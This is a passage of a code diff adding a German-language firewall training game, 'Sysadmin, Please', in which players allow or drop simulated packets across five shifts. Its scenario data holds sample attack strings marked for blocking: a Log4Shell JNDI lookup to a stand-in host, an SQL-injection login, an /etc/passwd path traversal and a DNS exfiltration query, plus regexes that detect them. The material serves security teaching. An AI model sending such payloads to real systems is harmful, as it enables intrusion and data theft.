+            begruendung: "Das TLS-Zertifikat der Gegenseite ist abgelaufen! Verbindung unsicher, Integrität der Firmware nicht garantiert."
+          },
+          {
+            titel: "Online-Banking: Gehälter überweisen",
+            ingress: "LAN (VLAN 30)",
+            srcMac: "BC:24:11:30:99:88",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.30.10",
+            dstIp: "193.159.24.1",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 54100,
+            dstPort: 443,
+            flags: "ACK",
+            cert: { cn: "hax0r-phishing-gate.ru", issuer: "Fake Russian Free CA", valid: "Gültig bis 2027", ok: false },
+            payload: "POST /login HTTP/1.1\r\nHost: sparkasse-online.de",
+            erwartet: "DENY",
+            begruendung: "Massiver Man-in-the-Middle / Phishing-Angriff! Die aufgerufene URL sparkasse-online.de liefert ein Zertifikat für hax0r-phishing-gate.ru aus."
+          },
+          {
+            titel: "MedTech-Labor Telemetrie",
+            ingress: "LAN (VLAN 50)",
+            srcMac: "00:0C:29:50:BB:22",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.50.12",
+            dstIp: "10.42.20.15",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 51200,
+            dstPort: 443,
+            flags: "ACK",
+            cert: { cn: "*.medtech-sanitas.de", issuer: "MedTech Root CA", valid: "Gültig bis 2029", ok: true },
+            payload: "POST /api/dicom-sync HTTP/1.1\r\nHost: labor.medtech-sanitas.de",
+            erwartet: "PERMIT",
+            begruendung: "Wildcard-Zertifikat *.medtech-sanitas.de deckt die Subdomain labor.medtech-sanitas.de vollständig ab."
+          }
+        ]
+      },
+      {
+        tag: 3,
+        titel: "Tag 3: TCP-Flags & Port-Scan-Abwehr",
+        regeln: [
+          { text: "<b>Stealth Scans:</b> Pakete mit ungültigen TCP-Flag-Kombinationen (Xmas: FIN+PSH+URG, Null-Scan: 0 Flags, SYN+FIN) müssen blockiert werden.", typ: "crit" },
+          { text: "<b>Hop Limit / TTL:</b> Eingehende Pakete mit TTL <= 1 verwerfen (Traceroute Mapping / Routing Loops).", typ: "warn" },
+          { text: "<b>Standard Handshake:</b> Reguläre SYN und ACK Pakete für erlaubte Dienste durchlassen.", typ: "warn" }
+        ],
+        faelle: [
+          {
+            titel: "WAN-Angriff: Weihnachtsbaum-Muster",
+            ingress: "WAN (Glasfaser-Uplink)",
+            srcMac: "00:50:56:AA:01:99",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "198.51.100.42",
+            dstIp: "10.42.254.10",
+            proto: "TCP (6)",
+            ttl: 52,
+            srcPort: 41200,
+            dstPort: 443,
+            flags: "FIN, PSH, URG (XMAS)",
+            cert: null,
+            payload: "[Kein Nutzdaten-Inhalt / Probe]",
+            erwartet: "DENY",
+            begruendung: "Xmas-Scan! FIN+PSH+URG leuchtet auf wie ein Weihnachtsbaum. Wird von nmap genutzt, um geschlossene Ports über RFC-793-Verhalten zu enttarnen."
+          },
+          {
+            titel: "WAN-Angriff: Lautloser Spion",
+            ingress: "WAN (Glasfaser-Uplink)",
+            srcMac: "00:50:56:AA:01:99",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "198.51.100.42",
+            dstIp: "10.42.254.10",
+            proto: "TCP (6)",
+            ttl: 48,
+            srcPort: 41201,
+            dstPort: 80,
+            flags: "[KEINE FLAGS / NULL]",
+            cert: null,
+            payload: "[Kein Nutzdaten-Inhalt]",
+            erwartet: "DENY",
+            begruendung: "Null-Scan! TCP-Paket ohne gesetzte Steuerflags verletzt die TCP-Zustandslogik und dient der Reconnaissance."
+          },
+          {
+            titel: "Kundenportal: Echte Ticket-Anfrage",
+            ingress: "WAN (Glasfaser-Uplink)",
+            srcMac: "00:1A:2B:CC:DD:EE",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "84.112.50.19",
+            dstIp: "10.42.254.10",
+            proto: "TCP (6)",
+            ttl: 58,
+            srcPort: 58190,
+            dstPort: 443,
+            flags: "SYN",
+            cert: { cn: "support.medtech-sanitas.de", issuer: "Let's Encrypt", valid: "Gültig", ok: true },
+            payload: "Client Hello",
+            erwartet: "PERMIT",
+            begruendung: "Legitimer Kunden-Zugriff auf das öffentliche DMZ-Ticketportal über HTTPS."
+          },
+          {
+            titel: "Hop-Limit Traceroute Probe",
+            ingress: "WAN (Glasfaser-Uplink)",
+            srcMac: "00:50:56:AA:01:99",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "203.0.113.88",
+            dstIp: "10.42.20.5",
+            proto: "ICMP (1)",
+            ttl: 1,
+            srcPort: "–",
+            dstPort: "–",
+            flags: "Echo Request",
+            cert: null,
+            payload: "Ping Probe (TTL = 1)",
+            erwartet: "DENY",
+            begruendung: "TTL = 1! Das Paket würde beim nächsten Hop sterben und ein ICMP Time Exceeded erzeugen. Dient dem Ausspähen unserer internen Router-Topologie."
+          }
+        ]
+      },
+      {
+        tag: 4,
+        titel: "Tag 4: Deep Packet Inspection (DPI) & Exploit-Abwehr",
+        regeln: [
+          { text: "<b>Log4Shell (CVE-2021-44228):</b> Muster wie ${jndi:ldap...} oder ${jndi:rmi...} im Header oder Payload sofort blockieren!", typ: "crit" },
+          { text: "<b>SQL-Injection:</b> SQL-Steuerzeichen wie ' OR '1'='1' oder UNION SELECT im HTTP-Request sofort verwerfen.", typ: "crit" },
+          { text: "<b>Path Traversal:</b> Zeichenketten mit ../../etc/passwd dürfen nicht an Webdienste gelangen.", typ: "crit" }
+        ],
+        faelle: [
+          {
+            titel: "Ticket-Suche mit Schadcode",
+            ingress: "WAN (DMZ Proxy)",
+            srcMac: "E4:5F:01:22:33:44",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "194.67.210.15",
+            dstIp: "10.42.254.10",
+            proto: "TCP (6)",
+            ttl: 54,
+            srcPort: 52140,
+            dstPort: 443,
+            flags: "ACK, PSH",
+            cert: { cn: "support.medtech-sanitas.de", issuer: "Let's Encrypt", valid: "Gültig", ok: true },
+            payload: "GET /search?q=${jndi:ldap://evil-payload.cc:1389/Exploit} HTTP/1.1\r\nUser-Agent: Mozilla/5.0",
+            erwartet: "DENY",
+            begruendung: "Expliziter Log4Shell-Angriff (JNDI Remote Code Execution)! Ziel ist das Nachladen von Schadcode auf dem Java-Backend."
+          },
+          {
+            titel: "Kundenportal: Login-Maske",
+            ingress: "WAN (DMZ Proxy)",
+            srcMac: "E4:5F:01:22:33:44",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "185.220.101.5",
+            dstIp: "10.42.254.10",
+            proto: "TCP (6)",
+            ttl: 50,
+            srcPort: 48900,
+            dstPort: 443,
+            flags: "ACK, PSH",
+            cert: { cn: "support.medtech-sanitas.de", issuer: "Let's Encrypt", valid: "Gültig", ok: true },
+            payload: "POST /login HTTP/1.1\r\n\r\nuser=admin' OR '1'='1' --&pass=secret",
+            erwartet: "DENY",
+            begruendung: "Klassische SQL-Injection! Der Angreifer versucht die Passwortprüfung per Tautologie ('1'='1') zu umgehen."
+          },
+          {
+            titel: "Dokumenten-Download: PDF Rechnung",
+            ingress: "LAN (VLAN 40)",
+            srcMac: "BC:24:11:40:55:66",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.40.15",
+            dstIp: "10.42.20.10",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 53120,
+            dstPort: 80,
+            flags: "ACK, PSH",
+            cert: null,
+            payload: "GET /docs/rechnung_2026_10.pdf HTTP/1.1\r\nHost: files.medtech.local",
+            erwartet: "PERMIT",
+            begruendung: "Regulärer interner Dateizugriff auf eine Rechnungsdatei ohne bösartige Parameter."
+          },
+          {
+            titel: "Dateimanager: Dateipfad-Manipulation",
+            ingress: "WAN (DMZ Proxy)",
+            srcMac: "E4:5F:01:22:33:44",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "185.220.101.5",
+            dstIp: "10.42.254.10",
+            proto: "TCP (6)",
+            ttl: 52,
+            srcPort: 49012,
+            dstPort: 443,
+            flags: "ACK, PSH",
+            cert: { cn: "support.medtech-sanitas.de", issuer: "Let's Encrypt", valid: "Gültig", ok: true },
+            payload: "GET /download?file=../../../../../../etc/passwd HTTP/1.1",
+            erwartet: "DENY",
+            begruendung: "Path Traversal (Directory Traversal)! Der Angreifer versucht das Web-Root zu verlassen und sensible Systemdateien auszulesen."
+          }
+        ]
+      },
+      {
+        tag: 5,
+        titel: "Tag 5: Incident Response & VIP-Business-Traffic",
+        regeln: [
+          { text: "<b>VIP VoIP-Schutz:</b> Telefonate der Geschäftsführung (VLAN 30, UDP 5060 SIP und RTP) MÜSSEN durchgelassen werden. Jeder Drop führt zu Chef-Abmahnung!", typ: "crit" },
+          { text: "<b>DNS-Exfiltration:</b> Abnormale DNS-Pakete mit verdächtig langen Base64-Strings in Subdomains (DNS Tunneling) sofort abwehren!", typ: "crit" },
+          { text: "<b>Gastnetz-Isolation:</b> Geräte aus VLAN 90 (Gäste) dürfen unter keinen Umständen auf interne Server oder Management-IPs (10.42.10.x / 10.42.20.x) zugreifen.", typ: "crit" }
+        ],
+        faelle: [
+          {
+            titel: "WICHTIG: Chef im Aufsichtsrats-Call",
+            ingress: "LAN (Port 3, VLAN 30)",
+            srcMac: "00:1A:2B:30:01:01",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.30.5",
+            dstIp: "217.116.118.5",
+            proto: "UDP (17)",
+            ttl: 64,
+            srcPort: 5060,
+            dstPort: 5060,
+            flags: "–",
+            cert: null,
+            payload: "INVITE sip:board@klinik-holding.de SIP/2.0\r\nUser-Agent: Snom-D785",
+            erwartet: "PERMIT",
+            begruendung: "Legitimer SIP VoIP-Verbindungsaufbau des Geschäftsführers. Bei Blockade bricht das Telefonat ab!"
+          },
+          {
+            titel: "Verdacht auf Datenabfluss: DNS-Kanal",
+            ingress: "LAN (VLAN 50 Labor)",
+            srcMac: "00:0C:29:50:99:11",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.50.88",
+            dstIp: "8.8.8.8",
+            proto: "UDP (17)",
+            ttl: 64,
+            srcPort: 59122,
+            dstPort: 53,
+            flags: "–",
+            cert: null,
+            payload: "Query: cGF0aWVudF9pZD05OTAxO2RpYWdub3Npcz1jYW5jZXI.exfil.darknet-c2.cc",
+            erwartet: "DENY",
+            begruendung: "DNS Data Exfiltration / C2 Tunneling! Base64-kodierte Patientendaten werden über DNS-Abfragen an einen externen Nameserver geschmuggelt."
+          },
+          {
+            titel: "Gast-Laptop greift auf Serverraum zu",
+            ingress: "WLAN (VLAN 90 Gäste)",
+            srcMac: "A4:C3:F0:11:22:33",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.90.142",
+            dstIp: "10.42.10.1",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 49800,
+            dstPort: 22,
+            flags: "SYN",
+            cert: null,
+            payload: "SSH-Verbindung zum Core-Switch",
+            erwartet: "DENY",
+            begruendung: "Bruch der Mandantentrennung! Gäste-WLAN (VLAN 90) darf keinen Zugriff auf das Management-VLAN (10.42.10.x) haben."
+          },
+          {
+            titel: "Nächtliches Desaster-Backup",
+            ingress: "LAN (VLAN 20 Server)",
+            srcMac: "BC:24:11:20:05:01",
+            dstMac: "00:1A:2B:99:FF:01",
+            srcIp: "10.42.20.10",
+            dstIp: "195.201.55.12",
+            proto: "TCP (6)",
+            ttl: 64,
+            srcPort: 42100,
+            dstPort: 873,
+            flags: "ACK",
+            cert: { cn: "offsite-backup.medtech-sanitas.de", issuer: "Let's Encrypt", valid: "Gültig", ok: true },
+            payload: "rsync daemon transfer: encrypted block stream",
+            erwartet: "PERMIT",
+            begruendung: "Legitimer nächtlicher Backup-Transfer (3-2-1-Regel) auf das externe Offsite-Rechenzentrum."
+          }
+        ]
+      }
+    ],
+
+    oeffne: function () {
+      this.initModal();
+      const modal = document.getElementById(this.modalId);
+      if (modal) {
+        modal.classList.add("offen");
+        this.ladeTag(1);
+      }
+    },
+
+    schliessen: function () {
+      const modal = document.getElementById(this.modalId);
+      if (modal) modal.classList.remove("offen");
+    },
+
+    initModal: function () {
+      let modal = document.getElementById(this.modalId);
+      if (modal) return;
+
+      modal = document.createElement("div");
+      modal.id = this.modalId;
+      modal.className = "spModalOverlay";
+      modal.innerHTML = `
+        <div class="spWindow">
+          <div class="spCrtOverlay"></div>
+
+          <!-- Top HUD -->
+          <div class="spTopBar">
+            <div class="spBrand">
+              <span class="spBrandIcon">👮</span>
+              <div class="spBrandTitle">
+                <h2>Sysadmin, Please</h2>
+                <span class="spSub" id="spSubHeader">Gateway Border Inspector · MedTech Sanitas Firewall</span>
+              </div>
+            </div>
+
+            <div class="spHudStats">
+              <div class="spStatBox">
+                <span class="lbl">SCHICHT</span>
+                <span class="val" id="spHudTag">Tag 1 / 5</span>
+              </div>
+              <div class="spStatBox sla">
+                <span class="lbl">SLA-STATUS</span>
+                <span class="val" id="spHudSla">100.0%</span>
+              </div>
+              <div class="spStatBox budget">
+                <span class="lbl">GEHALT</span>
+                <span class="val" id="spHudGehalt">2.500 €</span>
+              </div>
+              <div class="spStatBox warnings">
+                <span class="lbl">ABMAHNUNGEN</span>
+                <span class="val" id="spHudStrafen">0 / 3</span>
+              </div>
+            </div>
+
+            <button type="button" class="spCloseBtn" id="spCloseBtn" title="Schließen (Esc)">✕</button>
+          </div>
+
+          <!-- Desk Workspace -->
+          <div class="spDesk">
+            <!-- Left Column: Matrix Printer & Tools -->
+            <div class="spLeftCol">
+              <div class="spPrinterBox">
+                <div class="spPrinterHeader">
+                  <span>📠 Strafzettel-Drucker</span>
+                  <span id="spPrinterCount" style="color:#ef4444; font-weight:800;">0 Rügen</span>
+                </div>
+                <div class="spPrinterSlot" id="spPrinterSlot">
+                  <div class="spCitationEmpty" id="spCitationEmpty">
+                    <span>Keine Verstöße registriert.<br>Saubere Filterarbeit, Azubi!</span>
+                  </div>
+                </div>
+              </div>
+
+              <div class="spToolsCard">
+                <span style="font-size:0.75rem; font-weight:800; color:#94a3b8; text-transform:uppercase;">Inspektor-Werkzeuge</span>
+                <button type="button" class="spToolBtn" id="spToolDpi">
+                  <span>🔍</span>
+                  <span>Deep Packet Inspector (DPI)</span>
+                </button>
+                <button type="button" class="spToolBtn" id="spToolWhois">
+                  <span>🌐</span>
+                  <span>Whois &amp; DNS Lookup</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Center Column: Dossier & Mechanical Stamps -->
+            <div class="spCenterCol">
+              <div class="spDossierFolder" id="spDossierFolder">
+                <div class="spStampWatermark" id="spWatermark">ERLAUBT</div>
+                
+                <div class="spDossierTabs">
+                  <button type="button" class="spDossierTab akt" data-tab="header" id="spTabHeader">📋 L2/L3 Header</button>
+                  <button type="button" class="spDossierTab" data-tab="transport" id="spTabTransport">🔒 L4 Transport &amp; TLS</button>
+                  <button type="button" class="spDossierTab" data-tab="payload" id="spTabPayload">📦 L7 Payload</button>
+                </div>
+
+                <div class="spDossierContent" id="spDossierContent"></div>
+              </div>
+
+              <!-- Heavy Mechanical Stamps -->
+              <div class="spStampsPanel">
+                <button type="button" class="spStampBtn permit" id="spStampPermit">
+                  <span>✓</span>
+                  <span>[ ERLAUBEN ]</span>
+                </button>
+                <button type="button" class="spStampBtn deny" id="spStampDeny">
+                  <span>✕</span>
+                  <span>[ VERWERFEN ]</span>
+                </button>
+              </div>
+            </div>
+
+            <!-- Right Column: Rulebook / Directives -->
+            <div class="spRightCol">
+              <div class="spRulebook">
+                <div class="spRuleHeader">
+                  <span style="font-size:1.2rem;">📜</span>
+                  <div>
+                    <h3 id="spRulebookTitle">Dienstvorschrift Tag 1</h3>
+                    <span style="font-size:0.7rem; color:#94a3b8;">Sicherheitsrichtlinie MedTech Sanitas</span>
+                  </div>
+                </div>
+                <div class="spRuleList" id="spRuleList"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+
+      document.body.appendChild(modal);
+
+      // Event-Listener verdrahten
+      const closeBtn = document.getElementById("spCloseBtn");
+      if (closeBtn) closeBtn.onclick = () => this.schliessen();
+
+      document.getElementById("spTabHeader")?.addEventListener("click", () => this.setzeReiter("header"));
+      document.getElementById("spTabTransport")?.addEventListener("click", () => this.setzeReiter("transport"));
+      document.getElementById("spTabPayload")?.addEventListener("click", () => this.setzeReiter("payload"));
+
+      document.getElementById("spStampPermit")?.addEventListener("click", () => this.stempeln("PERMIT"));
+      document.getElementById("spStampDeny")?.addEventListener("click", () => this.stempeln("DENY"));
+
+      document.getElementById("spToolDpi")?.addEventListener("click", () => {
+        this.dpiAktiv = !this.dpiAktiv;
+        document.getElementById("spToolDpi")?.classList.toggle("akt", this.dpiAktiv);
+        this.soundPaper();
+        this.setzeReiter("payload");
+      });
+
+      document.getElementById("spToolWhois")?.addEventListener("click", () => {
+        this.zeigeWhoisModal();
+      });
+
+      window.addEventListener("keydown", (e) => {
+        if (!modal.classList.contains("offen")) return;
+        if (e.key === "Escape") this.schliessen();
+        if (e.key === "1" || e.key === "e" || e.key === "E") this.stempeln("PERMIT");
+        if (e.key === "2" || e.key === "v" || e.key === "V" || e.key === "d" || e.key === "D") this.stempeln("DENY");
+      });
+    },
+
+    setzeReiter: function (reiter) {
+      this.aktReiter = reiter;
+      document.querySelectorAll(".spDossierTab").forEach(t => t.classList.remove("akt"));
+      if (reiter === "header") document.getElementById("spTabHeader")?.classList.add("akt");
+      if (reiter === "transport") document.getElementById("spTabTransport")?.classList.add("akt");
+      if (reiter === "payload") document.getElementById("spTabPayload")?.classList.add("akt");
+      this.rendereDossier();
+    },
+
+    ladeTag: function (tagNum) {
+      this.aktTag = tagNum;
+      this.aktFallIdx = 0;
+      this.stempelSperre = false;
+      this.dpiAktiv = false;
+      document.getElementById("spToolDpi")?.classList.remove("akt");
+
+      const tagData = this.TAGE.find(t => t.tag === tagNum) || this.TAGE[0];
+      
+      const hudTag = document.getElementById("spHudTag");
+      if (hudTag) hudTag.textContent = `Tag ${tagNum} / 5`;
+
+      const ruleTitle = document.getElementById("spRulebookTitle");
+      if (ruleTitle) ruleTitle.textContent = tagData.titel;
+
+      const ruleList = document.getElementById("spRuleList");
+      if (ruleList) {
+        ruleList.innerHTML = tagData.regeln.map(r => `
+          <div class="spRuleItem ${r.typ}">
+            ${r.text}
+          </div>
+        `).join("");
+      }
+
+      this.soundPaper();
+      this.ladeFall();
+    },
+
+    ladeFall: function () {
+      const tagData = this.TAGE.find(t => t.tag === this.aktTag) || this.TAGE[0];
+      const fall = tagData.faelle[this.aktFallIdx];
+
+      if (!fall) {
+        this.beendeTag();
+        return;
+      }
+
+      // Watermark verstecken
+      const wm = document.getElementById("spWatermark");
+      if (wm) {
+        wm.className = "spStampWatermark";
+      }
+
+      this.stempelSperre = false;
+      this.rendereDossier();
+    },
+
+    rendereDossier: function () {
+      const tagData = this.TAGE.find(t => t.tag === this.aktTag) || this.TAGE[0];
+      const fall = tagData.faelle[this.aktFallIdx];
+      const c = document.getElementById("spDossierContent");
+      if (!c || !fall) return;
+
+      if (this.aktReiter === "header") {
+        c.innerHTML = `
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; border-bottom:1px solid #334155; padding-bottom:6px;">
+            <span style="font-weight:800; color:#38bdf8; font-size:0.92rem;">📁 PAKET-FALL #${this.aktFallIdx + 1}: ${fall.titel}</span>
+            <span style="font-size:0.75rem; color:#94a3b8;">Schnittstelle: <b>${fall.ingress}</b></span>
+          </div>
+
+          <h4 style="margin:8px 0 4px; color:#94a3b8; font-size:0.75rem; text-transform:uppercase;">Layer 2: Ethernet Frame (IEEE 802.3)</h4>
+          <table class="spHeaderTable">
+            <tr><th>Quell-MAC (Source):</th><td><code>${fall.srcMac}</code></td></tr>
+            <tr><th>Ziel-MAC (Dest):</th><td><code>${fall.dstMac}</code></td></tr>
+            <tr><th>Ingress Interface:</th><td><span class="${fall.ingress.includes('WAN') ? 'spNoticeHighlight' : ''}">${fall.ingress}</span></td></tr>
+          </table>
+
+          <h4 style="margin:12px 0 4px; color:#94a3b8; font-size:0.75rem; text-transform:uppercase;">Layer 3: IP-Header (RFC 791 / RFC 8200)</h4>
+          <table class="spHeaderTable">
+            <tr><th>Quell-IP (Source):</th><td><code class="${this.istPrivat(fall.srcIp) && fall.ingress.includes('WAN') ? 'spAlertHighlight' : ''}">${fall.srcIp}</code></td></tr>
+            <tr><th>Ziel-IP (Dest):</th><td><code>${fall.dstIp}</code></td></tr>
+            <tr><th>Protokoll:</th><td>${fall.proto}</td></tr>
+            <tr><th>TTL (Time to Live):</th><td><span class="${fall.ttl <= 1 ? 'spAlertHighlight' : ''}">${fall.ttl} Hops</span></td></tr>
+          </table>
+        `;
+      } else if (this.aktReiter === "transport") {
+        const certHtml = fall.cert ? `
+          <div style="background:rgba(15,23,42,0.8); border:1px solid ${fall.cert.ok ? '#10b981' : '#ef4444'}; border-radius:8px; padding:10px; margin-top:10px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+              <span style="font-weight:700; color:${fall.cert.ok ? '#34d399' : '#f87171'};">🔒 TLS-Zertifikat</span>
+              <span class="${fall.cert.ok ? 'spNoticeHighlight' : 'spAlertHighlight'}">${fall.cert.valid}</span>
+            </div>
+            <div style="font-size:0.78rem; line-height:1.45;">
+              <div>Common Name (CN): <b>${fall.cert.cn}</b></div>
+              <div>Issuer (Aussteller): <b>${fall.cert.issuer}</b></div>
+            </div>
+          </div>
+        ` : `<div style="color:#64748b; font-size:0.8rem; margin-top:10px;">Keine TLS-Verschlüsselung (Klartext-Verbindung oder L4-Probe)</div>`;
+
+        c.innerHTML = `
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; border-bottom:1px solid #334155; padding-bottom:6px;">
+            <span style="font-weight:800; color:#38bdf8; font-size:0.92rem;">🔒 LAYER 4: TRANSPORT &amp; SICHERHEIT</span>
+            <span style="font-size:0.75rem; color:#94a3b8;">Flags: <b>${fall.flags}</b></span>
+          </div>
+
+          <table class="spHeaderTable">
+            <tr><th>Quell-Port:</th><td><code>${fall.srcPort}</code></td></tr>
+            <tr><th>Ziel-Port (Dienst):</th><td><code class="${fall.dstPort === 23 || fall.dstPort === 21 ? 'spAlertHighlight' : ''}">${fall.dstPort}</code></td></tr>
+            <tr><th>TCP Steuerflags:</th><td><span class="${fall.flags.includes('XMAS') || fall.flags.includes('NULL') ? 'spAlertHighlight' : ''}">${fall.flags}</span></td></tr>
+          </table>
+
+          <h4 style="margin:14px 0 4px; color:#94a3b8; font-size:0.75rem; text-transform:uppercase;">Zertifikats-Status</h4>
+          ${certHtml}
+        `;
+      } else if (this.aktReiter === "payload") {
+        let payloadText = fall.payload;
+        if (this.dpiAktiv) {
+          payloadText = payloadText
+            .replace(/(\$\{jndi:[^}]+\})/g, `<span class="vuln">$1 [LOG4SHELL DETECTED]</span>`)
+            .replace(/(' OR '1'='1' --)/g, `<span class="vuln">$1 [SQLi DETECTED]</span>`)
+            .replace(/(\.\.\/\.\.\/\.\.\/[^\s]+)/g, `<span class="vuln">$1 [PATH TRAVERSAL DETECTED]</span>`)
+            .replace(/(cGF0aWVud[A-Za-z0-9+/=]+)/g, `<span class="vuln">$1 [BASE64 EXFILTRATION]</span>`);
+        }
+
+        c.innerHTML = `
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; border-bottom:1px solid #334155; padding-bottom:6px;">
+            <span style="font-weight:800; color:#38bdf8; font-size:0.92rem;">📦 LAYER 7: APPLICATION PAYLOAD</span>
+            <span style="font-size:0.75rem; color:${this.dpiAktiv ? '#34d399' : '#94a3b8'};">${this.dpiAktiv ? '🔍 DPI-Scanner: AKTIV' : 'Normaler Hex-Dump'}</span>
+          </div>
+
+          <p style="font-size:0.78rem; color:#94a3b8; margin:0 0 8px;">
+            ${this.dpiAktiv ? 'Erweiterte Signaturanalyse prüft Hex-Strings auf bekannte Exploits, Shell-Injections und DNS-Tunnel.' : 'Aktiviere das <b>DPI-Werkzeug</b> links in der Leiste, um Payloads auf verborgene Signaturen zu untersuchen.'}
+          </p>
+
+          <div class="spHexDump">${payloadText}</div>
+        `;
+      }
+    },
+
+    istPrivat: function (ip) {
+      if (!ip) return false;
+      return ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.16.") || ip.startsWith("127.");
+    },
+
+    stempeln: function (aktion) {
+      if (this.stempelSperre) return;
+      this.stempelSperre = true;
+
+      const tagData = this.TAGE.find(t => t.tag === this.aktTag) || this.TAGE[0];
+      const fall = tagData.faelle[this.aktFallIdx];
+      if (!fall) return;
+
+      const wm = document.getElementById("spWatermark");
+      if (wm) {
+        wm.textContent = aktion === "PERMIT" ? "ERLAUBT" : "VERWORFEN";
+        wm.className = `spStampWatermark ${aktion.toLowerCase()}`;
+      }
+
+      if (aktion === "PERMIT") this.soundPermit();
+      else this.soundDeny();
+
+      const warKorrekt = aktion === fall.erwartet;
+
+      setTimeout(() => {
+        if (!warKorrekt) {
+          this.registriereFehler(fall, aktion);
+        } else {
+          this.gehalt += 150;
+          this.aktualisiereHud();
+        }
+
+        // Nächster Fall nach kurzer Pause
+        setTimeout(() => {
+          this.aktFallIdx++;
+          this.ladeFall();
+        }, 800);
+      }, 450);
+    },
+
+    registriereFehler: function (fall, aktion) {
+      this.strafen++;
+      this.sla = Math.max(85.0, (this.sla - 3.2)).toFixed(1);
+      this.gehalt = Math.max(500, this.gehalt - 250);
+
+      this.soundPrinter();
+      this.aktualisiereHud();
+
+      const slot = document.getElementById("spPrinterSlot");
+      const empty = document.getElementById("spCitationEmpty");
+      if (empty) empty.style.display = "none";
+
+      const count = document.getElementById("spPrinterCount");
+      if (count) count.textContent = `${this.strafen} Rügen`;
+
+      const paper = document.createElement("div");
+      paper.className = "spCitationPaper";
+      paper.innerHTML = `
+        <span class="tit">⚠️ ABMAHNUNG #${this.strafen}: FEHLENTSCHEIDUNG</span>
+        <div><b>Fall:</b> ${fall.titel}</div>
+        <div><b>Deine Aktion:</b> ${aktion} (Falsch!)</div>
+        <div style="margin-top:4px; font-weight:700; color:#991b1b;">${fall.begruendung}</div>
+        <div style="margin-top:4px; font-size:0.7rem; color:#b45309;">Sanktion: -250 € Gehalt, SLA sinkt.</div>
+      `;
+      slot.prepend(paper);
+
+      if (this.strafen >= 3) {
+        setTimeout(() => this.gameOver(), 1000);
+      }
+    },
+
+    aktualisiereHud: function () {
+      const slaEl = document.getElementById("spHudSla");
+      if (slaEl) slaEl.textContent = `${this.sla}%`;
+
+      const gehEl = document.getElementById("spHudGehalt");
+      if (gehEl) gehEl.textContent = `${this.gehalt.toLocaleString("de-DE")} €`;
+
+      const strEl = document.getElementById("spHudStrafen");
+      if (strEl) strEl.textContent = `${this.strafen} / 3`;
+    },
+
+    beendeTag: function () {
+      const c = document.getElementById("spDossierContent");
+      if (!c) return;
+
+      const naechsterTag = this.aktTag + 1;
+      const hatNochTage = naechsterTag <= this.TAGE.length;
+
+      c.innerHTML = `
+        <div class="spDayEndCard">
+          <h2>🎉 Schicht beendet: Tag ${this.aktTag} abgeschlossen!</h2>
+          <p style="color:#cbd5e1; font-size:0.88rem; line-height:1.5;">
+            Du hast alle eingehenden Pakete der Schicht nach IHK-Sicherheitskriterien geprüft.<br>
+            Aktueller SLA-Stand: <b>${this.sla}%</b> · Gehalt: <b>${this.gehalt} €</b>
+          </p>
+          ${hatNochTage ? `
+            <button type="button" class="spNextBtn" id="spNextDayBtn">
+              🚀 Weiter zu Tag ${naechsterTag}: ${this.TAGE[naechsterTag - 1].titel.split(":")[1]}
+            </button>
+          ` : `
+            <div style="padding:12px; background:rgba(16,185,129,0.2); border:1px solid #10b981; border-radius:8px; margin-top:14px;">
+              <h3 style="color:#34d399; margin:0 0 6px;">🏆 MEISTER-GATEWAY-INSPEKTOR</h3>
+              <p style="margin:0; font-size:0.84rem;">Du hast alle 5 Schichten erfolgreich überstanden und das Unternehmensnetzwerk vor Spoofing, Exploits und Datenabfluss geschützt!</p>
+            </div>
+            <button type="button" class="spNextBtn" id="spRestartBtn" style="background:#10b981;">
+              🔄 Schicht 1 erneut spielen
+            </button>
+          `}
+        </div>
+      `;
+
+      document.getElementById("spNextDayBtn")?.addEventListener("click", () => this.ladeTag(naechsterTag));
+      document.getElementById("spRestartBtn")?.addEventListener("click", () => this.ladeTag(1));
+    },
+
+    gameOver: function () {
+      const c = document.getElementById("spDossierContent");
+      if (!c) return;
+
+      c.innerHTML = `
+        <div class="spDayEndCard" style="border-color:#ef4444;">
+          <h2 style="color:#ef4444;">💥 KÜNDIGUNG EINGEREICHT!</h2>
+          <p style="color:#cbd5e1; font-size:0.88rem; line-height:1.5;">
+            Du hast 3 gravierende Sicherheits- oder SLA-Verstöße begangen. Entweder drang Schadsoftware ins Intranet ein oder wichtige Geschäftstelefonate wurden abgewürgt.
+          </p>
+          <button type="button" class="spNextBtn" id="spRetryBtn" style="background:#dc2626;">
+            🔄 Schicht wiederholen
+          </button>
+        </div>
+      `;
+
+      document.getElementById("spRetryBtn")?.addEventListener("click", () => {
+        this.strafen = 0;
+        this.sla = 100.0;
+        this.gehalt = 2500;
+        const slot = document.getElementById("spPrinterSlot");
+        if (slot) slot.innerHTML = '<div class="spCitationEmpty" id="spCitationEmpty"><span>Keine Verstöße registriert.<br>Saubere Filterarbeit, Azubi!</span></div>';
+        this.aktualisiereHud();
+        this.ladeTag(this.aktTag);
+      });
+    },
+
+    zeigeWhoisModal: function () {
+      const tagData = this.TAGE.find(t => t.tag === this.aktTag) || this.TAGE[0];
+      const fall = tagData.faelle[this.aktFallIdx];
+      if (!fall) return;
+
